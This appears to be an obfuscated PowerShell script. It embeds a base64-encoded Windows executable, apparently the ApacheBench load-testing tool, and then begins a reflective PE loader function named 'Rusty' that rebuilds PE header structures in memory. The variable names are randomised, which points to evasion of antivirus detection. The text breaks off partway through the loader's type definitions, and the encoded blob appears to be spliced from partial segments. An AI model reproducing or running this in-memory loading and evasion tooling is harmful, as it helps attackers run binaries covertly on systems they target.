param($arguments="")

$dvmnMITO99 = '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AAAAAAAus8AALDPAAAAAAAABwAAgAQAAIAJAACANAAAgA4AAIAMAACAFQAAgBcAAIADAACAEgAAgAoAAICXAACAcwAAgHQAAIBvAACAAAAAABMBX2lvYgAAWAJmcHJpbnRmALcCc3RyY2hyAACOAV9wY3R5cGUAYQBfX21iX2N1cl9tYXgAAEkCZXhpdAAAPQJhdG9pAAAVAV9pc2N0eXBlAACeAnByaW50ZgAArwJzaWduYWwAAJECbWFsbG9jAABAAmNhbGxvYwAATwJmZmx1c2gAAEwCZmNsb3NlAACcAnBlcnJvcgAAVwJmb3BlbgCkAnFzb3J0APEAX2Z0b2wAwQJzdHJuY3B5AMUCc3Ryc3RyAADAAnN0cm5jbXAAXgJmcmVlAADIAF9lcnJubwAAegBfX3BfX3dlbnZpcm9uAG0AX19wX19lbnZpcm9uAACnAnJlYWxsb2MAxAJzdHJzcG4AAJsCbW9kZgAAvAJzdHJlcnJvcgAA4wJ3Y3NjcHkAAOYCd2NzbGVuAACzAF9jbG9zZQAA6AJ3Y3NuY21wAMMCc3RycmNocgBNU1ZDUlQuZGxsAABVAF9fZGxsb25leGl0AIYBX29uZXhpdADTAF9leGl0AEgAX1hjcHRGaWx0ZXIAZABfX3BfX19pbml0ZW52AFgAX19nZXRtYWluYXJncwAPAV9pbml0dGVybQCDAF9fc2V0dXNlcm1hdGhlcnIAAJ0AX2FkanVzdF9mZGl2AABqAF9fcF9fY29tbW9kZQAAbwBfX3BfX2Ztb2RlAACBAF9fc2V0X2FwcF90eXBlAADKAF9leGNlcHRfaGFuZGxlcjMAALcAX2NvbnRyb2xmcAAAHQNTZXRMYXN0RXJyb3IAAO4ARnJlZUVudmlyb25tZW50U3RyaW5nc1cATwFHZXRFbnZpcm9ubWVudFN0cmluZ3NXAAD1AUdsb2JhbEZyZWUAAAkBR2V0Q29tbWFuZExpbmVXAFYDVGxzQWxsb2MAAFcDVGxzRnJlZQCMAER1cGxpY2F0ZUhhbmRsZQA6AUdldEN1cnJlbnRQcm9jZXNzABoDU2V0SGFuZGxlSW5mb3JtYXRpb24AAC4AQ2xvc2VIYW5kbGUAwAFHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQC8AEZpbGVUaW1lVG9TeXN0ZW1UaW1lAADYAUdldFRpbWVab25lSW5mb3JtYXRpb24AALsARmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUATgNTeXN0ZW1UaW1lVG9GaWxlVGltZQAATwNTeXN0ZW1UaW1lVG9UelNwZWNpZmljTG9jYWxUaW1lAEkDU2xlZXAA6gBGb3JtYXRNZXNzYWdlQQAAaQFHZXRMYXN0RXJyb3IAAIUDV2FpdEZvclNpbmdsZU9iamVjdABJAENyZWF0ZUV2ZW50QQAALANTZXRTdGRIYW5kbGUAABADU2V0RmlsZVBvaW50ZXIAAE0AQ3JlYXRlRmlsZUEAUABDcmVhdGVGaWxlVwCMAUdldE92ZXJsYXBwZWRSZXN1bHQAgwBEZXZpY2VJb0NvbnRyb2wAWgFHZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZQAAUgJMb2NhbEZyZWUAXgFHZXRGaWxlVHlwZQBaAENyZWF0ZU11dGV4QQAAGQJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAHoARGVsZXRlQ3JpdGljYWxTZWN0aW9uAI8ARW50ZXJDcml0aWNhbFNlY3Rpb24AALgCUmVsZWFzZU11dGV4AAALA1NldEV2ZW50AABHAkxlYXZlQ3JpdGljYWxTZWN0aW9uAABRA1Rlcm1pbmF0ZVByb2Nlc3MAAFIBR2V0RXhpdENvZGVQcm9jZXNzAADfAUdldFZlcnNpb25FeEEAmAFHZXRQcm9jQWRkcmVzcwAASAJMb2FkTGlicmFyeUEAAJcDV3JpdGVGaWxlAKsCUmVhZEZpbGUAAIcCUGVla05hbWVkUGlwZQBLRVJORUwzMi5kbGwAAB0AQWxsb2NhdGVBbmRJbml0aWFsaXplU2lkAADhAEZyZWVTaWQAQURWQVBJMzIuZGxsAABXU09DSzMyLmRsbAA5AFdTQVNlbmQANABXU0FSZWN2AFdTMl8zMi5kbGwAAMUBX3N0cm5pY21wAL8BX3N0cmR1cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAZAAAAAEAAAABAAAAAQAAAAAAAACAw8kBAAAAAOALQQAyAAAAQgAAAEsAAABQAAAAWgAAAF8AAABiAAAAYwAAAGQAAAAlczogQ2Fubm90IHVzZSBjb25jdXJyZW5jeSBsZXZlbCBncmVhdGVyIHRoYW4gdG90YWwgbnVtYmVyIG9mIHJlcXVlc3RzCgAlczogSW52YWxpZCBDb25jdXJyZW5jeSBbUmFuZ2UgMC4uJWRdCgAAJXM6IGludmFsaWQgVVJMCgAAAAAlczogd3JvbmcgbnVtYmVyIG9mIGFyZ3VtZW50cwoAAFVzZXItQWdlbnQ6AEFjY2VwdDoASG9zdDoAAABQcm94eS1BdXRob3JpemF0aW9uOiBCYXNpYyAAUHJveHkgY3JlZGVudGlhbHMgdG9vIGxvbmcKAEF1dGhvcml6YXRpb246IEJhc2ljIAAAAEF1dGhlbnRpY2F0aW9uIGNyZWRlbnRpYWxzIHRvbyBsb25nCgAAAABDb29raWU6IAAAAAANCgAAQ2Fubm90IG1peCBQVVQgYW5kIEhFQUQKAAAAAENhbm5vdCBtaXggUE9TVCBhbmQgSEVBRAoAAABDYW5ub3QgbWl4IFBPU1QvU'+'FVUIGFuZCBIRUFECgAAAEludmFsaWQgbnVtYmVyIG9mIHJlcXVlc3RzCgBuOmM6dDpiOlQ6cDp1OnY6cmtWaHdpeDp5Ono6QzpIOlA6QTpnOlg6ZGU6U3EAAABiZ2NvbG9yPXdoaXRlAAAAVG90YWwgb2YgJWQgcmVxdWVzdHMgY29tcGxldGVkCgAlcwoALi5kb25lCgBGaW5pc2hlZCAlZCByZXF1ZXN0cwoAAABhcHJfc29ja2V0X2Nvbm5lY3QoKQAAAAAKVGVzdCBhYm9ydGVkIGFmdGVyIDEwIGZhaWx1cmVzCgoAAAAKU2VydmVyIHRpbWVkIG91dAoKAGFwcl9wb2xsAAAAAGFwcl9zb2NrYWRkcl9pbmZvX2dldCgpIGZvciAlcwAAZXJyb3IgY3JlYXRpbmcgcmVxdWVzdCBidWZmZXI6IG91dCBvZiBtZW1vcnkKAAAASU5GTzogJXMgaGVhZGVyID09IAotLS0KJXMKLS0tCgBSZXF1ZXN0IHRvbyBsb25nCgAAACVzICVzIEhUVFAvMS4wDQolcyVzJXNDb250ZW50LWxlbmd0aDogJXUNCkNvbnRlbnQtdHlwZTogJXMNCiVzDQoAAAAAUFVUAFBPU1QAAAAAdGV4dC9wbGFpbgAAJXMgJXMgSFRUUC8xLjANCiVzJXMlcyVzDQoAAEhFQUQAAAAAR0VUAENvbm5lY3Rpb246IEtlZXAtQWxpdmUNCgAAAABBY2NlcHQ6ICovKg0KAAAAVXNlci1BZ2VudDogQXBhY2hlQmVuY2gvAAAAADIuMwBIb3N0OiAAAGFwcl9wb2xsc2V0X2NyZWF0ZSBmYWlsZWQAAAAoYmUgcGF0aWVudCklcwAALi4uAAoAAABbdGhyb3VnaCAlczolZF0gAAAAAEJlbmNobWFya2luZyAlcyAAAAAAJXM6ICVzICglZCkKAAAAAFNlbmQgcmVxdWVzdCBmYWlsZWQhCgAAAFNlbmQgcmVxdWVzdCB0aW1lZCBvdXQhCgAAAAAlcwklSTY0ZAklSTY0ZAklSTY0ZAklSTY0ZAklSTY0ZAoAAABzdGFydHRpbWUJc2Vjb25kcwljdGltZQlkdGltZQl0dGltZQl3YWl0CgAAAENhbm5vdCBvcGVuIGdudXBsb3Qgb3V0cHV0IGZpbGUAJWQsJS4zZgoAAAAAUGVyY2VudGFnZSBzZXJ2ZWQsVGltZSBpbiBtcwoAAABDYW5ub3Qgb3BlbiBDU1Ygb3V0cHV0IGZpbGUAdwAAACAgJWQlJSAgJTVJNjRkCgAgMTAwJSUgICU1STY0ZCAobG9uZ2VzdCByZXF1ZXN0KQoAAAAgMCUlICA8MD4gKG5ldmVyKQoAAApQZXJjZW50YWdlIG9mIHRoZSByZXF1ZXN0cyBzZXJ2ZWQgd2l0aGluIGEgY2VydGFpbiB0aW1lIChtcykKAABUb3RhbDogICAgICAlNUk2NGQgJTVJNjRkJTVJNjRkCgAAAABQcm9jZXNzaW5nOiAlNUk2NGQgJTVJNjRkJTVJNjRkCgAAAABDb25uZWN0OiAgICAlNUk2NGQgJTVJNjRkJTVJNjRkCgAAAAAgICAgICAgICAgICAgIG1pbiAgIGF2ZyAgIG1heAoAAFdBUk5JTkc6IFRoZSBtZWRpYW4gYW5kIG1lYW4gZm9yIHRoZSB0b3RhbCB0aW1lIGFyZSBub3Qgd2l0aGluIGEgbm9ybWFsIGRldmlhdGlvbgogICAgICAgIFRoZXNlIHJlc3VsdHMgYXJlIHByb2JhYmx5IG5vdCB0aGF0IHJlbGlhYmxlLgoAAAAAAAAAAEVSUk9SOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgdG90YWwgdGltZSBhcmUgbW9yZSB0aGFuIHR3aWNlIHRoZSBzdGFuZGFyZAogICAgICAgZGV2aWF0aW9uIGFwYXJ0LiBUaGVzZSByZXN1bHRzIGFyZSBOT1QgcmVsaWFibGUuCgBXQVJOSU5HOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgd2FpdGluZyB0aW1lIGFyZSBub3Qgd2l0aGluIGEgbm9ybWFsIGRldmlhdGlvbgogICAgICAgIFRoZXNlIHJlc3VsdHMgYXJlIHByb2JhYmx5IG5vdCB0aGF0IHJlbGlhYmxlLgoAAAAAAABFUlJPUjogVGhlIG1lZGlhbiBhbmQgbWVhbiBmb3IgdGhlIHdhaXRpbmcgdGltZSBhcmUgbW9yZSB0aGFuIHR3aWNlIHRoZSBzdGFuZGFyZAogICAgICAgZGV2aWF0aW9uIGFwYXJ0LiBUaGVzZSByZXN1bHRzIGFyZSBOT1QgcmVsaWFibGUuCgAAAAAAAABXQVJOSU5HOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgcHJvY2Vzc2luZyB0aW1lIGFyZSBub3Qgd2l0aGluIGEgbm9ybWFsIGRldmlhdGlvbgogICAgICAgIFRoZXNlIHJlc3VsdHMgYXJlIHByb2JhYmx5IG5vdCB0aGF0IHJlbGlhYmxlLgoAAABFUlJPUjogVGhlIG1lZGlhbiBhbmQgbWVhbiBmb3IgdGhlIHByb2Nlc3NpbmcgdGltZSBhcmUgbW9yZSB0aGFuIHR3aWNlIHRoZSBzdGFuZGFyZAogICAgICAgZGV2aWF0aW9uIGFwYXJ0LiBUaGVzZSByZXN1bHRzIGFyZSBOT1QgcmVsaWFibGUuCgAAAABXQVJOSU5HOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgaW5pdGlhbCBjb25uZWN0aW9uIHRpbWUgYXJlIG5vdCB3aXRoaW4gYSBub3JtYWwgZGV2aWF0aW9uCiAgICAgICAgVGhlc2UgcmVzdWx0cyBhcmUgcHJvYmFibHkgbm90IHRoYXQgcmVsaWFibGUuCgAAAEVSUk9SOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgaW5pdGlhbCBjb25uZWN0aW9uIHRpbWUgYXJlIG1vcmUgdGhhbiB0d2ljZSB0aGUgc3RhbmRhcmQKICAgICAgIGRldmlhdGlvbiBhcGFydC4gVGhlc2UgcmVzdWx0cyBhcmUgTk9UIHJlbGlhYmxlLgoAAAAAVG90YWw6ICAgICAgJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAV2FpdGluZzogICAgJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAUHJvY2Vzc2luZzogJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAQ29ubmVjdDogICAgJTVJNjRkICU0STY0ZCAlNS4xZiAlNkk2NGQgJTdJNjRkCgAAICAgICAgICAgICAgICBtaW4gIG1lYW5bKy8tc2RdIG1lZGlhbiAgIG1heAoAAAAACkNvbm5lY3Rpb24gVGltZXMgKG1zKQoAICAgICAgICAgICAgICAgICAgICAgICAgJS4yZiBrYi9zIHRvd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'+''
 
function Rusty
{


[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $CVDncjuZ99,

    [Parameter(Position = 1)]
    [String[]]
    $rQSYDZED99,

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $KvjRRenh99 = 'Void',

    [Parameter(Position = 3)]
    [String]
    $fjeCFrVH99,

    [Parameter(Position = 4)]
    [Int32]
    $exsasvkm99,

    [Parameter(Position = 5)]
    [String]
    $VlMSmfKv99,

    [Switch]
    $ueHcUoLs99,

    [Switch]
    $TaqPgsYR99
)

Set-StrictMode -Version 2


$CXaaxouO99 = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $CVDncjuZ99,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $KvjRRenh99,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $exsasvkm99,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $VlMSmfKv99,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ueHcUoLs99
    )

    Function jab
    {
        $gbwmFOmN99 = New-Object System.Object

        $BLUdgJVj99 = [AppDomain]::CurrentDomain
        $heySnHrk99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $DDEnPpJp99 = $BLUdgJVj99.DefineDynamicAssembly($heySnHrk99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $wftivHdY99 = $DDEnPpJp99.DefineDynamicModule('DynamicModule', $false)
        $GBJsnDbA99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]



        $oUBRQwDZ99 = $wftivHdY99.DefineEnum('MachineType', 'Public', [UInt16])
        $oUBRQwDZ99.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $oUBRQwDZ99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $oUBRQwDZ99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $oUBRQwDZ99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $WMruYgAx99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $WMruYgAx99

        $oUBRQwDZ99 = $wftivHdY99.DefineEnum('MagicType', 'Public', [UInt16])
        $oUBRQwDZ99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $OcjgusFv99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $OcjgusFv99

        
        $oUBRQwDZ99 = $wftivHdY99.DefineEnum('SubSystemType', 'Public', [UInt16])
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $qCMxMxDQ99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $qCMxMxDQ99

        
        $oUBRQwDZ99 = $wftivHdY99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $oUBRQwDZ99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $oUBRQwDZ99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $oUBRQwDZ99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $oUBRQwDZ99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $oUBRQwDZ99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $oUBRQwDZ99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $npuTqXAq99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $npuTqXAq99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_DATA_DIRECTORY', $mvduPRIu99, [System.ValueType], 8)
        ($oUBRQwDZ99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($oUBRQwDZ99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $RORaVCky99 = $oUBRQwDZ99.CreateType()
        $gbwmFOmN99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $RORaVCky99

        
        $mvduPRIu99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $oUBRQwDZ99 = $wftivHdY99.DefineType('IMAGE_FILE_HEADER', $mvduPRIu99, [System.ValueType], 20)
        $oUBRQwDZ99.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $oUBRQwDZ99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
